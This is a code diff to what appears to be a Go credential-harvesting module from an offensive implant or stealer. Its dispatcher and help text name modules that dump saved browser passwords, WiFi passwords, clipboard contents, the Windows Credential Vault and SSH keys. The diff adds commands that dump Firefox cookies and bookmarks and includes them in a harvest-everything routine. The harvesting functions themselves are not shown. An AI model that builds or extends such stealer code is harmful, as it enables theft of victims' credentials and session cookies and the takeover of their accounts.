@@ -40,6 +40,10 @@ func HarvestCredentials(target string) ([]byte, error) {
 	switch target {
 	case "browser", "browsers":
 		return harvestBrowserCreds()
+	case "cookies":
+		return harvestFirefoxCookies()
+	case "bookmarks":
+		return harvestFirefoxBookmarks()
 	case "wifi":
 		return harvestWifiPasswords()
 	case "clipboard":
@@ -64,6 +68,8 @@ func HarvestCredentials(target string) ([]byte, error) {
 		var sb strings.Builder
 		sb.WriteString("Credential Harvesting Modules:\n")
 		sb.WriteString("  creds browser     Chrome/Firefox/Edge saved passwords\n")
+		sb.WriteString("  creds cookies     Dump browser cookies (Firefox)\n")
+		sb.WriteString("  creds bookmarks   Dump browser bookmarks (Firefox)\n")
 		sb.WriteString("  creds wifi        Saved WiFi passwords\n")
 		sb.WriteString("  creds clipboard   Current clipboard contents\n")
 		sb.WriteString("  creds vault       Windows Credential Vault\n")
@@ -83,6 +89,8 @@ func harvestAll() ([]byte, error) {
 		fn   func() ([]byte, error)
 	}{
 		{"Browser Credentials", harvestBrowserCreds},
+		{"Browser Cookies", harvestFirefoxCookies},
+		{"Browser Bookmarks", harvestFirefoxBookmarks},
 		{"WiFi Passwords", harvestWifiPasswords},
 		{"Clipboard", harvestClipboard},
 		{"SSH Keys", harvestSSHKeys},
